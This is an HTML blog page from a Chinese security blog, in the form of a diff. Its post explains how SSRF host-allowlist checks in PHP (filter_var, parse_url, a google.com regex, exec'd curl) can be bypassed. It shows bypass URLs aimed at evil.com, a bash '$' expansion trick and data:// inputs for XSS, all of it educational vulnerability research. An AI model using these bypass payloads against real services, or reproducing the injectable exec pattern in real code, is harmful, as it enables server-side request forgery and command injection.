@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="测试代码: 12345678910111213141516171819&lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;n&quot;;   &#x2F;&#x2F; check if argument is a valid URL   if(filter_var($argv[1], FILTER_VALIDATE_URL)) &amp;#123;      &#x2F;&#x2F; p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF的trick">
+<meta property="og:url" content="http://example.com/2022/06/30/PHP/SSRF%E7%9A%84trick/index.html">
+<meta property="og:site_name" content="Hack the world">
+<meta property="og:description" content="测试代码: 12345678910111213141516171819&lt;?php   echo &quot;Argument: &quot;.$argv[1].&quot;n&quot;;   &#x2F;&#x2F; check if argument is a valid URL   if(filter_var($argv[1], FILTER_VALIDATE_URL)) &amp;#123;      &#x2F;&#x2F; p">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-06-30T09:34:19.349Z">
+<meta property="article:modified_time" content="2022-06-30T09:37:23.518Z">
+<meta property="article:author" content="D0gekong">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/06/30/PHP/SSRF%E7%9A%84trick/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/06/30/PHP/SSRF%E7%9A%84trick/","path":"2022/06/30/PHP/SSRF的trick/","title":"SSRF的trick"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SSRF的trick | Hack the world</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hack the world</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fake it till Make it</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D0gekong"
+      src="/images/pic.jpg">
+  <p class="site-author-name" itemprop="name">D0gekong</p>
+  <div class="site-description" itemprop="description">散人的漫漫学习路</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SantaJiang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SantaJiang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/jiangshengda@foxmail.com" title="E-Mail → jiangshengda@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/3aa0cb901bee" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3aa0cb901bee" rel="noopener" target="_blank"><i class="fab fa-jianshu fa-fw"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jsd581?spm=1010.2135.3001.5421" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jsd581?spm&#x3D;1010.2135.3001.5421" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/30/PHP/SSRF%E7%9A%84trick/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSRF的trick
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-06-30 17:34:19 / 修改时间：17:37:23" itemprop="dateCreated datePublished" datetime="2022-06-30T17:34:19+08:00">2022-06-30</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>测试代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo &quot;Argument: &quot;.$argv[1].&quot;n&quot;;</span><br><span class="line">   // check if argument is a valid URL</span><br><span class="line">   if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      // parse URL</span><br><span class="line">      $r = parse_url($argv[1]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      // check if host ends with google.com</span><br><span class="line">      if(preg_match(&#x27;/google.com$/&#x27;, $r[&#x27;host&#x27;])) &#123;</span><br><span class="line">         // get page from URL</span><br><span class="line">         exec(&#x27;curl -v -s &quot;&#x27;.$r[&#x27;host&#x27;].&#x27;&quot;&#x27;, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码从输入的第一个参数获取url,然后使用filter_var()来验证url的格式。如果通过检验，parse_url会解析，再使用正则表达式来检查主机名是否以google.com结尾。<br>如果全都通过，最后会通过curl发起一个http请求来获取网页的内容，再打印出内容</p>
+<p>按照代码的预期来说，只能接受google.com的请求，不接受其他目标</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://google.com</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com</span><br></pre></td></tr></table></figure>
+<p>对于普通人来说这确实已经足够安全了，但是我们要继续尝试bypass<br>在上面的代码正则表达用于检验请求主机名是否以google.com结尾。但你熟悉URI语法，你应该明白分号和逗号可能是你利用远程主机上的ssrf的方法</p>
+<p>许多URL方案中都有保留字符，保留字符都有特定含义。它们在URL的方案特定部分中的外观具有指定的语义。如果在一个方案中保留了与八位组相对应的字符，则该八位组必须被编码。除了字符“;”, “/”, “?”, “:”, “@”, “=” 和 “&amp;” 被定义为保留字符，其余一律为不保留字符。</p>
+<p>除了分层路径中的dot-segments之外，一般语法认为路径段不透明。 生成应用程序的URI通常使用段中允许的保留字符来分隔scheme-specific或者dereference-handler-specific子组件。 例如分号(“；”) 和等于(“=”) 保留字符通常用于分隔适用于该段的参数和参数值。 逗号(“，”) 保留字符通常用于类似目的。</p>
+<p>例如，一个URI生产者可能使用一个段name;v=1.1来表示对“name”版本1.1的引用，而另一个可能使用诸如“name，1.1”的段来表示相同含义。参数类型可以由scheme-specific 语义来定义，但在大多数情况下，一个参数的语法是特定的URI引用算法的实现。</p>
+<p>若应用于主机evil.com;google.com可能会被curl 或者wget 解析成hostname: evil.com 和 querystring: google.com，不如来试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://evil.com;google.com</span><br></pre></td></tr></table></figure>
+
+
+<p>函数filter_var()可以解析许多类型的 URL schema，从上面可以看出filter_var()拒绝以主机名和“HTTP”作为schema验证请求的URL，但如果把 schema从http:// 改成别的会怎样呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com;google.com</span><br></pre></td></tr></table></figure>
+
+<p>成功bypass，但是curl请求失败了，尝试下其他语法不让google.com被解析成主机的一部分。比如说增加端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com:80;google.com:80/</span><br></pre></td></tr></table></figure>
+
+<p>成功访问网站，使用逗号尝试下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil.com:80,google.com:80/</span><br></pre></td></tr></table></figure>
+
+
+<p>对于parse_url来说，parse_url()是用于解析一个 URL 并返回一个包含在 URL 中出现的各种组成部分关联数组的PHP函数。这个函数并不是要验证给定的URL，它只是将它分解成上面列出的部分。 部分网址也可以作为parse_url()的输入并被尽可能的正确解析，最后的执行命令成功与否要看bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0://evil$google.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash将$google分析为一个空变量，并且使用curl请求了evil &lt;empty&gt; .com，实际就是evil.com.但是这样只能发生在curl语法里，在parse_url解析的主机名仍然是evil$google.com。 $ google变量并没有被解释。 只有当使用了exec()函数而且脚本又使用$r[‘host’]来创建一个curl HTTP请求时，Bash才会将其转换为一个空变量。</span><br></pre></td></tr></table></figure>
+
+<p>这里也可以尝试xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   echo &quot;Argument: &quot;.$argv[1].&quot;n&quot;;</span><br><span class="line">   // check if argument is a valid URL</span><br><span class="line">   if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      // parse URL</span><br><span class="line">      $r = parse_url($argv[1]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      // check if host ends with google.com</span><br><span class="line">      if(preg_match(&#x27;/google.com$/&#x27;, $r[&#x27;host&#x27;])) &#123;</span><br><span class="line">         // get page from URL</span><br><span class="line">         $a = file_get_contents($argv[1]);</span><br><span class="line">         echo($a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里把exec换成了file_get_contents调用curl，这里尝试在url里加入一些文本来修改响应主体</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,SSBsb3ZlIFBIUAo=google.com //I Love PHP</span><br></pre></td></tr></table></figure>
+
+<p>parse_url()不允许将文本设置为请求主机，并且返回了“not allowed host”正确拒绝解析。我们可以尝试将某些东西注入URI的MIME类型部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://google.com/plain;base64,SSBsb3ZlIFBIUAo=</span><br></pre></td></tr></table></figure>
+
+<p>成功解析了，接下来尝试xss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text.google.com/plain;base64,&lt;...b64...&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/06/30/Java/MVC/" rel="prev" title="MVC">
+                  <i class="fa fa-chevron-left"></i> MVC
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/07/02/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E4%B9%85%E8%BF%9D%E7%9A%84%E6%80%BB%E7%BB%93/" rel="next" title="久违的总结">
+                  久违的总结 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">D0gekong</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
